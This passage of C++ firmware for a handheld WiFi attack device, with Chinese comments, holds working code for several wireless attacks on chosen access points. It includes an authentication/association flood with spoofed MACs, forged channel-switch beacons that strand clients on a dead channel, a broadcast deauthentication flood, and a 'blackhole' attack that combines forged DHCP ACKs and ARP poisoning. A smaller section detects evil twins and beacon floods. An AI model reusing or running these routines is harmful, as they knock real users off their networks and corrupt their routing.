    g_screen = SCREEN_MAIN; currentSelection = 1; g_pendingMenuDraw = true;
    return;
  }

  g_attackStop = false;
  g_attackRunningType = 10;
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("认证关联洪水攻击");

  int cycleCount = 0;
  unsigned long lastLog = 0;

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗

    cycleCount++;

    // 日志输出 + ECG更新
    unsigned long now = millis();
    if (now - lastLog >= 2000) {
      lastLog = now;
      // 预估总包数 = 轮次×目标数×每客户端发包数(认证+关联=2帧)
      unsigned long estPkts = (unsigned long)cycleCount * targets.size() * MAC_PER_CYCLE * 2UL;
      updateECG(estPkts);
      Serial.print("[AuthFlood] 轮次: ");
      Serial.print(cycleCount);
      Serial.print(" 伪造客户端MAC数/轮: ");
      Serial.println(MAC_PER_CYCLE);
    }

    // 对每个目标AP，用大量随机MAC发送认证+关联请求
    for (int idx : targets) {
      if (g_attackStop) break;
      if (idx < 0 || (size_t)idx >= scan_results.size()) continue;

      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
      const char* ssid = scan_results[idx].ssid.c_str();

      for (int m = 0; m < MAC_PER_CYCLE; m++) {
        if (g_attackStop) break;
        uint8_t fakeMac[6];
        generateRandomMAC(fakeMac);

        // 发送认证请求
        wifi_tx_auth_req(fakeMac, scan_results[idx].bssid);
        delayMicroseconds(200);

        // 发送关联请求
        wifi_tx_assoc_req(fakeMac, scan_results[idx].bssid, ssid);
        delayMicroseconds(300);
      }
      }

    delay(50);  // 每轮间隔
  }

  Serial.print("[AuthFlood] 攻击已停止, 总轮次: ");
  Serial.println(cycleCount);
  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== CSA 信道劫持攻击 ====================
// CSA = Channel Switch Announcement (802.11h)
// 发送包含CSA IE的伪造Beacon帧，诱使客户端切换到死信道
struct CsaBeacon {
  // 802.11 Header (24 bytes)
  uint16_t frame_control = 0x80;
  uint16_t duration = 0;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  bssid[6];
  uint16_t sequence_number = 0;
  // Beacon Body
  uint64_t timestamp = 0;
  uint16_t beacon_interval = 0x64;
  uint16_t capabilities = 0x0431;
  // SSID IE
  uint8_t  ssid_tag = 0x00;
  uint8_t  ssid_length = 0;
  uint8_t  ssid[32];
  // CSA IE (Element ID=37, Len=3)
  uint8_t  csa_tag = 37;     // 0x25 = Channel Switch Announcement
  uint8_t  csa_len = 3;
  uint8_t  csa_mode = 1;     // 1=不允许传输直到切换完成
  uint8_t  csa_new_ch = 0;   // 目标新信道
  uint8_t  csa_count = 1;    // 距切换剩余的Beacon次数
};

void attackCSA() {
  // 检查选中目标
  std::vector<int> targets;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) targets.push_back((int)i);
  }
  if (targets.empty()) {
    Serial.println("[CSA] 请先勾选目标AP!");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("请先勾选目标AP!");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("请先勾选目标AP!");
    delay(1500);
    g_screen = SCREEN_MAIN; currentSelection = 1; g_pendingMenuDraw = true;
    return;
  }

  g_attackStop = false;
  g_attackRunningType = 11;
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("CSA信道劫持攻击");

  // 选一个不存在的死信道（如14在某些地区不可用，或用149但大部分客户端不会自动切换）
  int deadChannel = 14;  // 2.4G: 14号信道（日本专用，大多客户端不支持）
  int packetCount = 0;

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗
    packetCount++;

    for (int idx : targets) {
      if (g_attackStop) break;
      if (idx < 0 || (size_t)idx >= scan_results.size()) continue;

      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      CsaBeacon csa;
      memcpy(csa.destination, BROADCAST_MAC, 6);
      memcpy(csa.source, scan_results[idx].bssid, 6);
      memcpy(csa.bssid, scan_results[idx].bssid, 6);

      const char* ssid = scan_results[idx].ssid.c_str();
      csa.ssid_length = strlen(ssid) > 31 ? 31 : strlen(ssid);
      memcpy(csa.ssid, ssid, csa.ssid_length);

      // 如果目标在5GHz，死信道就设为13
      if (scan_results[idx].channel > 14) deadChannel = 13;
      // 如果目标在2.4GHz，死信道就设为165
      else deadChannel = 165;

      csa.csa_new_ch = deadChannel;
      csa.csa_count = 1;  // 立即切换

      // 发送CSA Beacon（10次突发）
      for (int b = 0; b < 10; b++) {
        if (g_attackStop) break;
        wifi_tx_raw_frame(&csa, sizeof(CsaBeacon));
        delayMicroseconds(200);
      }
    }

    if (packetCount % 100 == 0) {
      updateECG((unsigned long)packetCount * 10UL);
      Serial.print("[CSA] 已发送 "); Serial.print(packetCount * 10);
      Serial.print(" 个CSA Beacon, 目标信道->死信道: ");
      Serial.println(deadChannel);
    }

    delay(30);  // 密集发送间隔
  }

  Serial.print("[CSA] 攻击已停止, 总发包数: ");
  Serial.println(packetCount * 10);
  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== 全广播解除认证攻击 ====================
// 一发解除AP上所有客户端（目标地址 = FF:FF:FF:FF:FF:FF）
void attackBcastDeauth() {
  std::vector<int> targets;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) targets.push_back((int)i);
  }
  if (targets.empty()) {
    Serial.println("[BcastDeauth] 请先勾选目标AP!");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("请先勾选目标AP!");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("请先勾选目标AP!");
    delay(1500);
    g_screen = SCREEN_MAIN; currentSelection = 1; g_pendingMenuDraw = true;
    return;
  }

  g_attackStop = false;
  g_attackRunningType = 12;
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("全广播解除认证攻击");

  int packetCount = 0;
  unsigned long lastLog = 0;

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗

    unsigned long now = millis();
    if (now - lastLog >= 2000) {
      lastLog = now;
      updateECG(packetCount);
      Serial.print("[BcastDeauth] 已发送 ");
      Serial.print(packetCount);
      Serial.println(" 广播Deauth帧");
    }

    for (int idx : targets) {
      if (g_attackStop) break;
      if (idx < 0 || (size_t)idx >= scan_results.size()) continue;

      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      DeauthFrame frame;
      memcpy(frame.source, scan_results[idx].bssid, 6);
      memcpy(frame.access_point, scan_results[idx].bssid, 6);
      memcpy(frame.destination, BROADCAST_MAC, 6);  // FF:FF:FF:FF:FF:FF

      // 多种原因码，每个Reason发10帧
      for (int r = 0; r < DEAUTH_REASON_COUNT; r++) {
        if (g_attackStop) break;
        frame.reason = DEAUTH_REASONS[r];
        for (int b = 0; b < 10; b++) {
          if (g_attackStop) break;
          wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
          packetCount++;
          delayMicroseconds(100);
        }
      }
      }

    delay(5);  // 极短间隔最大化密度
  }

  Serial.print("[BcastDeauth] 攻击已停止, 总发包数: ");
  Serial.println(packetCount);
  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== 广播黑洞攻击 ====================
// 双管齐下：① DHCP ACK洪水（伪造黑网关）② ARP投毒（网关MAC→无效地址）
// DHCP ACK 帧结构: 802.11(24) + LLC(8) + IP(20) + UDP(8) + DHCP(~250)
// ARP Reply 帧结构: 802.11(24) + LLC(8) + ARP(28)
#define BLACKHOLE_FRAME_MAXLEN 512

// 计算IPv4头部校验和（仅覆盖20字节IP头）
static uint16_t calcIpChecksum(uint8_t *buf) {
  uint32_t sum = 0;
  for (int i = 0; i < 20; i += 2) sum += ((uint16_t)buf[i] << 8) | buf[i + 1];
  while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
  return ~((uint16_t)sum);
}

// 构建DHCP ACK黑洞帧，返回总帧长
static int buildDhcpBlackhole(uint8_t *buf, const uint8_t *bssid) {
  memset(buf, 0, BLACKHOLE_FRAME_MAXLEN);

  // ── 802.11 Data Header ──
  buf[0] = 0x08;  buf[1] = 0x02;              // Frame Control: Data, ToDS=1
  memset(buf + 4, 0xFF, 6);                     // DA: Broadcast
  memcpy(buf + 10, bssid, 6);                   // SA: BSSID
  memcpy(buf + 16, bssid, 6);                   // BSSID

  // ── LLC/SNAP (IPv4) ──
  buf[24] = 0xAA; buf[25] = 0xAA; buf[26] = 0x03;
  buf[27] = 0x00; buf[28] = 0x00; buf[29] = 0x00;
  buf[30] = 0x08; buf[31] = 0x00;

  // ── 随机选择子网（常见家用路由器网段）──
  const uint8_t subnets[][4] = {
    {192, 168,   1, 0}, {192, 168,   0, 0},
    { 10,   0,   0, 0}, {172,  16,   0, 0},
    {192, 168,  10, 0}, {192, 168, 100, 0}
  };
  int sn = random(0, 6);
  uint8_t gwIP[4]  = {subnets[sn][0], subnets[sn][1], subnets[sn][2], 254};  // 黑网关
  uint8_t srvIP[4] = {subnets[sn][0], subnets[sn][1], subnets[sn][2], 1};
  uint8_t yiIP[4]  = {subnets[sn][0], subnets[sn][1], subnets[sn][2], (uint8_t)random(100, 200)};

  // ── IPv4 Header (20B, at offset 32) ──
  uint8_t *ip = buf + 32;
  ip[0] = 0x45; ip[1] = 0x00;                    // Ver4/IHL5, DSCP/ECN
  // Total Length (offset 2-3): filled later
  ip[4] = (uint8_t)random(1, 256); ip[5] = (uint8_t)random(0, 256);  // ID
  ip[6] = 0x00; ip[7] = 0x00;                    // Flags/Frag
  ip[8] = 64;                                     // TTL
  ip[9] = 17;                                     // Protocol: UDP
  // Checksum (offset 10-11): filled later
  memcpy(ip + 12, srvIP, 4);                      // Src = fake DHCP server
  memset(ip + 16, 0xFF, 4);                       // Dst = broadcast

  // ── UDP Header (8B, at offset 52) ──
  buf[52] = 0x00; buf[53] = 0x43;                 // Src Port 67 (bootps)
  buf[54] = 0x00; buf[55] = 0x44;                 // Dst Port 68 (bootpc)
  // Length (offset 56-57): filled later

  // ── DHCP ACK Payload (at offset 60) ──
  uint8_t *dhcp = buf + 60;
  dhcp[0] = 0x02;                                 // op: BOOTREPLY
  dhcp[1] = 0x01;                                 // htype: Ethernet
  dhcp[2] = 0x06;                                 // hlen: 6
  dhcp[3] = 0x00;                                 // hops: 0
  // xid (4 bytes): random
  dhcp[4] = (uint8_t)random(0, 256);  dhcp[5] = (uint8_t)random(0, 256);
  dhcp[6] = (uint8_t)random(0, 256);  dhcp[7] = (uint8_t)random(0, 256);
  dhcp[10] = 0x80; dhcp[11] = 0x00;               // flags: broadcast
  memcpy(dhcp + 16, yiIP, 4);                     // yiaddr: offered IP
  memcpy(dhcp + 20, srvIP, 4);                    // siaddr: server ID
  memset(dhcp + 28, 0xFF, 6);                     // chaddr: broadcast MAC
  memcpy(dhcp + 236, "\x63\x82\x53\x63", 4);      // Magic Cookie

  // ── DHCP Options ──
  int optOff = 240;
  // Option 53: DHCP Message Type = ACK (5)
  dhcp[optOff++] = 53; dhcp[optOff++] = 1; dhcp[optOff++] = 5;
  // Option 54: Server Identifier
  dhcp[optOff++] = 54; dhcp[optOff++] = 4;
  memcpy(dhcp + optOff, srvIP, 4); optOff += 4;
  // Option 1: Subnet Mask = 255.255.255.0
  dhcp[optOff++] = 1; dhcp[optOff++] = 4;
  dhcp[optOff++] = 255; dhcp[optOff++] = 255; dhcp[optOff++] = 255; dhcp[optOff++] = 0;
  // Option 3: Router/Gateway = BLACKHOLE IP ← 核心！
  dhcp[optOff++] = 3; dhcp[optOff++] = 4;
  memcpy(dhcp + optOff, gwIP, 4); optOff += 4;
  // Option 6: DNS Server = BLACKHOLE IP
  dhcp[optOff++] = 6; dhcp[optOff++] = 4;
  memcpy(dhcp + optOff, gwIP, 4); optOff += 4;
  // Option 51: Lease Time = 86400s (24h)
  dhcp[optOff++] = 51; dhcp[optOff++] = 4;
  dhcp[optOff++] = 0x00; dhcp[optOff++] = 0x01; dhcp[optOff++] = 0x51; dhcp[optOff++] = 0x80;
  // Option 255: END
  dhcp[optOff++] = 0xFF;

  int dhcpLen = optOff;                            // DHCP payload total length

  // ── 填写长度字段 ──
  int ipTotalLen   = 20 + 8 + dhcpLen;             // IP头 + UDP头 + DHCP
  int udpLen        =  8 + dhcpLen;                // UDP头 + 数据
  int totalFrameLen = 24 + 8 + ipTotalLen;         // 802.11 + LLC + IP包

  ip[2] = (ipTotalLen >> 8) & 0xFF;
  ip[3] = ipTotalLen & 0xFF;
  buf[56] = (udpLen >> 8) & 0xFF;
  buf[57] = udpLen & 0xFF;

  // IP校验和
  ip[10] = 0; ip[11] = 0;
  uint16_t cksum = calcIpChecksum(ip);
  ip[10] = (cksum >> 8) & 0xFF;
  ip[11] = cksum & 0xFF;

  return totalFrameLen;
}

// 构建ARP Reply投毒帧（声称网关IP映射到无效MAC）
static int buildArpBlackhole(uint8_t *buf, const uint8_t *bssid) {
  memset(buf, 0, BLACKHOLE_FRAME_MAXLEN);

  // ── 802.11 Data Header ──
  buf[0] = 0x08;  buf[1] = 0x02;                  // Data, ToDS=1
  memset(buf + 4, 0xFF, 6);                        // DA: Broadcast
  memcpy(buf + 10, bssid, 6);                      // SA: BSSID
  memcpy(buf + 16, bssid, 6);                      // BSSID

  // ── LLC/SNAP (ARP) ──
  buf[24] = 0xAA; buf[25] = 0xAA; buf[26] = 0x03;
  buf[27] = 0x00; buf[28] = 0x00; buf[29] = 0x00;
  buf[30] = 0x08; buf[31] = 0x06;                  // EtherType: ARP

  // ── ARP Reply (offset 32) ──
  uint8_t *arp = buf + 32;
  arp[0] = 0x00; arp[1] = 0x01;                    // Hardware: Ethernet
  arp[2] = 0x08; arp[3] = 0x00;                    // Protocol: IPv4
  arp[4] = 0x06;                                    // HW addr len
  arp[5] = 0x04;                                    // Proto addr len
  arp[6] = 0x00; arp[7] = 0x02;                    // Operation: Reply

  // Sender HW addr: 随机无效MAC（看起来像真的设备但不属于网关）
  uint8_t fakeGwMac[6];
  generateRandomMAC(fakeGwMac);
  fakeGwMac[0] &= 0xFC;  // 确保是单播地址
  memcpy(arp + 8, fakeGwMac, 6);

  // Sender IP: 随机常见的网关IP
  const uint8_t gwPool[][4] = {
    {192, 168,   1, 1}, {192, 168,   0, 1},
    { 10,   0,   0, 1}, {172,  16,   0, 1},
    {192, 168,  10, 1}, {192, 168, 100, 1}
  };
  int gi = random(0, 6);
  memcpy(arp + 14, gwPool[gi], 4);

  // Target: 空白或广播
  memset(arp + 18, 0xFF, 6);                       // Target HW: broadcast

  // Target IP: 与网关同网段的广播地址
  arp[24] = gwPool[gi][0]; arp[25] = gwPool[gi][1];
  arp[26] = gwPool[gi][2]; arp[27] = 255;

  return 24 + 8 + 28;  // 60 bytes total
}

void attackBlackhole() {
  // 1. 检查选中目标
  std::vector<int> targets;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) targets.push_back((int)i);
  }
  if (targets.empty()) {
    Serial.println("[Blackhole] 请先勾选目标AP!");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("请先勾选目标AP!");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("请先勾选目标AP!");
    delay(1500);
    g_screen = SCREEN_MAIN; currentSelection = 1; g_pendingMenuDraw = true;
    return;
  }

  g_attackStop = false;
  g_attackRunningType = 13;
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("广播黑洞攻击");

  // static 避免 512 字节栈分配导致栈溢出死机
  static uint8_t frameBuf[BLACKHOLE_FRAME_MAXLEN];
  int dhcpCount = 0, arpCount = 0;
  unsigned long lastLog = 0;
  unsigned long lastChanSwitch = 0;
  int chIdx = 0;

  // 收集目标信道（去重）
  std::set<int> chSet;
  for (int idx : targets) {
    if (idx >= 0 && (size_t)idx < scan_results.size())
      chSet.insert((int)scan_results[idx].channel);
  }
  std::vector<int> channels;
  for (int ch : chSet) channels.push_back(ch);

  Serial.print("[Blackhole] 目标AP数: "); Serial.print(targets.size());
  Serial.print("  信道数: "); Serial.print(channels.size());
  Serial.print("  攻击向量: DHCP ACK + ARP投毒");
  Serial.println();

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗

    unsigned long now = millis();

    // 轮转信道（每800ms切换以保证覆盖）
    if (now - lastChanSwitch >= 800) {
      lastChanSwitch = now;
      int ch = channels[chIdx % channels.size()];
      wext_set_channel(WLAN0_NAME, ch);
      chIdx++;
    }

    // 轮转目标AP（每次发送对应当前信道的一个AP）
    for (int idx : targets) {
      if (g_attackStop) break;
      if (idx < 0 || (size_t)idx >= scan_results.size()) continue;

      // ── ① 发送DHCP ACK黑洞帧 ──
      int dhcpLen = buildDhcpBlackhole(frameBuf, scan_results[idx].bssid);
      wifi_tx_raw_frame(frameBuf, dhcpLen);
      dhcpCount++;
      delayMicroseconds(300);

      // ── ② 发送ARP Reply投毒帧 ──
      int arpLen = buildArpBlackhole(frameBuf, scan_results[idx].bssid);
      wifi_tx_raw_frame(frameBuf, arpLen);
      arpCount++;
      delayMicroseconds(200);

      if (g_attackStop) break;
    }

    // 日志输出 + ECG更新
    if (now - lastLog >= 3000) {
      lastLog = now;
      updateECG((unsigned long)(dhcpCount + arpCount));
      Serial.print("[Blackhole] DHCP: "); Serial.print(dhcpCount);
      Serial.print("  ARP: "); Serial.print(arpCount);
      Serial.print("  信道: "); Serial.println(channels[chIdx % channels.size()]);
    }

    delay(40);
  }

  // 清理
  Serial.print("[Blackhole] 攻击已停止. DHCP ACK=");
  Serial.print(dhcpCount); Serial.print(" ARP=");
  Serial.println(arpCount);
  Serial.println("[Blackhole] 原理: DHCP ACK设置虚假网关 → 客户端路由到黑洞");
  Serial.println("[Blackhole]       ARP投毒 → 网关IP映射到无效MAC → 数据包丢弃");
  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

static std::vector<DetectEntry> g_detectResults;

// 收集扫描结果中的检测项
static void collectDetectionResults(const std::vector<WiFiScanResult>& results,
                                     DetectStats& stats) {
  g_detectResults.clear();
  stats.totalAPs   = (int)results.size();
  stats.openAPs    = 0;
  stats.hiddenAPs  = 0;
  stats.weakEncryptAPs = 0;
  stats.maxChDensity  = 0;
  stats.maxChDensityCh = 0;

  // 1. 统计信道密度
  std::map<int, int> chCount;
  for (auto& ap : results) {
    chCount[(int)ap.channel]++;
    if (ap.security_type == 0) stats.openAPs++;
    if (ap.ssid.length() == 0) stats.hiddenAPs++;
    if (ap.security_type == 1) stats.weakEncryptAPs++;  // WEP
  }
  for (auto& kv : chCount) {
    if (kv.second > stats.maxChDensity) {
      stats.maxChDensity   = kv.second;
      stats.maxChDensityCh = kv.first;
    }
  }

  // 2. 检测 SSID 重复（Beacon Flood / Evil Twin）
  std::map<String, std::vector<int>> ssidMap;  // SSID → 索引列表
  for (size_t i = 0; i < results.size(); i++) {
    if (results[i].ssid.length() > 0) {
      ssidMap[results[i].ssid].push_back((int)i);
    }
  }

  stats.ssidDupGroups = 0;
  for (auto& kv : ssidMap) {
    int count = (int)kv.second.size();
    if (count >= 3) {  // 同一SSID出现≥3次 → 可疑
      stats.ssidDupGroups++;
      DetectEntry e;
      e.channel = results[kv.second[0]].channel;

      // 判断是信标泛洪还是钓鱼AP
      bool mixedSecurity = false;
      bool mixedChannel  = false;
      int firstSec = results[kv.second[0]].security_type;
      uint firstCh = results[kv.second[0]].channel;
      for (int idx : kv.second) {
        if (results[idx].security_type != firstSec) mixedSecurity = true;
        if (results[idx].channel != firstCh)       mixedChannel  = true;
      }

      if (mixedSecurity || mixedChannel) {
        e.level = THREAT_HIGH;
        e.description = "疑似 Evil Twin 钓鱼攻击";
      } else {
        e.level = THREAT_MEDIUM;
        e.description = "疑似 Beacon 信标泛洪";
      }

      e.detail = "SSID=\"" + kv.first + "\" x" + String(count);
      e.detail += " CH" + String(firstCh);
      if (mixedChannel) e.detail += "+";
      g_detectResults.push_back(e);
    }
  }

  // 3. 信道密度异常检测
  if (stats.maxChDensity >= 10) {
    DetectEntry e;
    e.level = THREAT_MEDIUM;
    e.description = "信道密度异常偏高";
    e.detail = "CH" + String(stats.maxChDensityCh) + " 集中 "
             + String(stats.maxChDensity) + " 个AP";
    // 避免与 SSID 重复告警产生过多告警
    // 仅在信道密度>=15时强制告警
    if (stats.maxChDensity >= 15) {
      e.level = THREAT_HIGH;
      e.description = "严重信道拥塞/干扰";
    }
    e.channel = stats.maxChDensityCh;
    g_detectResults.push_back(e);
  }

  // 4. 开放网络过多 → 风险
  if (stats.openAPs >= 8) {
    DetectEntry e;
    e.level = THREAT_LOW;
    e.description = "大量开放WiFi网络";
    e.detail = String(stats.openAPs) + " 个无加密AP";
    e.channel = 0;
    g_detectResults.push_back(e);
  }

  // 5. WEP加密网络 → 不安全
  if (stats.weakEncryptAPs > 0) {
    DetectEntry e;
    e.level = THREAT_LOW;
    e.description = "检测到WEP加密网络";
    e.detail = String(stats.weakEncryptAPs) + " 个WEP网络(极易破解)";
    e.channel = 0;
    g_detectResults.push_back(e);
  }

  // 6. 隐藏SSID过多
  if (stats.hiddenAPs >= 5) {
    DetectEntry e;
    e.level = THREAT_LOW;
    e.description = "大量隐藏SSID网络";
    e.detail = String(stats.hiddenAPs) + " 个隐藏网络";
    e.channel = 0;
    g_detectResults.push_back(e);
  }
}

// ==================== 检测心电图 函数 ====================

static void initDetectECG() {
  g_detEcgHead = 0;
  g_detEcgCount = 0;
  g_detEcgMaxVal = 10;
  g_detEcgLastDraw = millis();
  memset(g_detEcgBuf, 0, sizeof(g_detEcgBuf));
  g_detEcgInited = true;
}

static void drawDetectECGFrame() {
  int x = DET_ECG_GRID_X, y = DET_ECG_GRID_Y, w = DET_ECG_GRID_W, h = DET_ECG_GRID_H;

  // 水平虚线（4条：25%/50%/75%）
  uint16_t gridColor = 0x1926;
  for (int i = 1; i <= 3; i++) {
    int gy = y + (h * i) / 4;
    for (int px = x; px < x + w; px += 4) {
      tft.drawPixel(px, gy, gridColor);
      tft.drawPixel(px + 1, gy, gridColor);
    }
  }
  // 网格边框
  tft.drawRect(x, y, w, h, 0x3CC7);

  // 左上角标签
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(x, y - 3);
  u8g2_for_adafruit_gfx.print("威胁脉冲");

  // 右上角 Y轴标签
  u8g2_for_adafruit_gfx.setForegroundColor(0x3CC7);
  u8g2_for_adafruit_gfx.setCursor(x + w - 45, y - 3);
  u8g2_for_adafruit_gfx.print("告警");
}

static void drawDetectECGWaveform() {
  int count = (g_detEcgCount < DET_ECG_BUF_SIZE) ? g_detEcgCount : DET_ECG_BUF_SIZE;
  if (count < 2) return;

  int x = DET_ECG_GRID_X, y = DET_ECG_GRID_Y, w = DET_ECG_GRID_W, h = DET_ECG_GRID_H;

  // 擦除波形区（保留右边框和下边框）
  tft.fillRect(x + 1, y + 1, w - 2, h - 2, COLOR_BG);

  // 重绘水平栅格
  uint16_t gc = 0x1926;
  for (int i = 1; i <= 3; i++) {
    int gy = y + (h * i) / 4;
    for (int px = x + 1; px < x + w - 1; px += 4) {
      tft.drawPixel(px, gy, gc);
      tft.drawPixel(px + 1, gy, gc);
    }
  }

  // 绘制折线
  int startIdx = (g_detEcgCount > DET_ECG_BUF_SIZE) ? (g_detEcgHead - DET_ECG_BUF_SIZE) : 0;
  int drawCount = (count > w) ? w : count;
  int step = (count > w) ? (count / w) : 1;

  for (int i = 1; i < drawCount; i++) {
    int idx0 = ((startIdx + (i - 1) * step) + DET_ECG_BUF_SIZE) % DET_ECG_BUF_SIZE;
    int idx1 = ((startIdx + i * step)       + DET_ECG_BUF_SIZE) % DET_ECG_BUF_SIZE;
    int v0 = g_detEcgBuf[idx0], v1 = g_detEcgBuf[idx1];
    int y0 = y + h - 1 - (v0 * h / (g_detEcgMaxVal > 0 ? g_detEcgMaxVal : 1));
    int y1 = y + h - 1 - (v1 * h / (g_detEcgMaxVal > 0 ? g_detEcgMaxVal : 1));
    if (y0 < y) y0 = y; if (y0 >= y + h) y0 = y + h - 1;
    if (y1 < y) y1 = y; if (y1 >= y + h) y1 = y + h - 1;
    tft.drawLine(x + i - 1, y0, x + i, y1, 0x07E0);
    if (abs(y1 - y0) < 3) tft.drawPixel(x + i - 1, y0 - 1, 0x05C0);  // 加粗
  }

  // 扫描光点
  if (drawCount > 0) {
    int lastIdx = (startIdx + drawCount - 1 + DET_ECG_BUF_SIZE) % DET_ECG_BUF_SIZE;
    int lv = g_detEcgBuf[lastIdx];
    int ly = y + h - 1 - (lv * h / (g_detEcgMaxVal > 0 ? g_detEcgMaxVal : 1));
    if (ly < y) ly = y;
    int lx = x + drawCount - 1;
    if (lx < x + w) {
      tft.fillCircle(lx, ly, 2, 0x07E0);
      tft.drawPixel(lx, ly, 0xFFFF);
    }
  }
}

// 喂一个数据点到检测心电图（AP数量或威胁强度），自动重绘
static void detectFeedECG(int value) {
  if (!g_detEcgInited) initDetectECG();

  // 自适应Y轴
  if (value > g_detEcgMaxVal) {
    g_detEcgMaxVal = value + 5;
    if (g_detEcgMaxVal < 10) g_detEcgMaxVal = 10;
  }

  // 写入环形缓冲区
  int mapped = (int)((unsigned long)value * DET_ECG_GRID_H / g_detEcgMaxVal);
  if (mapped > DET_ECG_GRID_H) mapped = DET_ECG_GRID_H;
  if (mapped < 1 && value > 0) mapped = 2;
  g_detEcgBuf[g_detEcgHead] = mapped;
  g_detEcgHead = (g_detEcgHead + 1) % DET_ECG_BUF_SIZE;
  if (g_detEcgCount < DET_ECG_BUF_SIZE * 2) g_detEcgCount++;

  // 仅首次调用时绘制框架
  if (g_detEcgCount == 1) drawDetectECGFrame();

  // 重绘波形
  drawDetectECGWaveform();
}

// 绘制攻击检测结果界面
static void drawDetectResultsUI(const DetectStats& stats, int scanPass, bool finished) {
  tft.fillScreen(COLOR_BG);

  // 标题栏
  uint16_t titleColor = finished ? 0x07E0 : 0xF800;
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, titleColor);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(titleColor);
  const char* titleText = finished ? "检测完成" : "攻击检测中...";
  int tw = u8g2_for_adafruit_gfx.getUTF8Width(titleText);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print(titleText);

  // ===== ECG 区域 =====
  // 始终重绘ECG，利用buffer数据恢复波形
  if (g_detEcgInited) {
    drawDetectECGFrame();
    drawDetectECGWaveform();
  }

  // 统计摘要行
  int statY = DET_ECG_GRID_Y + DET_ECG_GRID_H + 4;
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  char statLine[64];
  snprintf(statLine, sizeof(statLine), "扫描:%d/3  AP:%d  开放:%d  隐藏:%d",
           scanPass, stats.totalAPs, stats.openAPs, stats.hiddenAPs);
  tw = u8g2_for_adafruit_gfx.getUTF8Width(statLine);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, statY + 12);
  u8g2_for_adafruit_gfx.print(statLine);

  // 分隔线
  int sepY = statY + 18;
  tft.drawLine(0, sepY, SCREEN_WIDTH, sepY, 0x18E7);

  // 检测结果列表
  int yStart = sepY + 8;
  int resultCount = (int)g_detectResults.size();
  if (resultCount == 0 && finished) {
    u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
    u8g2_for_adafruit_gfx.setCursor(5, yStart);
    u8g2_for_adafruit_gfx.print("未检测到明显攻击威胁");
  } else if (resultCount == 0 && !finished) {
    u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
    u8g2_for_adafruit_gfx.setCursor(5, yStart);
    u8g2_for_adafruit_gfx.print("正在分析...");
  }

  int maxShow = 4;
  int yPos = yStart;
  for (int i = 0; i < resultCount && i < maxShow; i++) {
    const DetectEntry& e = g_detectResults[i];
    uint16_t lvlColor;
    const char* lvlText;
    switch (e.level) {
      case THREAT_HIGH:   lvlColor = 0xF800; lvlText = "[高]"; break;
      case THREAT_MEDIUM: lvlColor = 0xFFE0; lvlText = "[中]"; break;
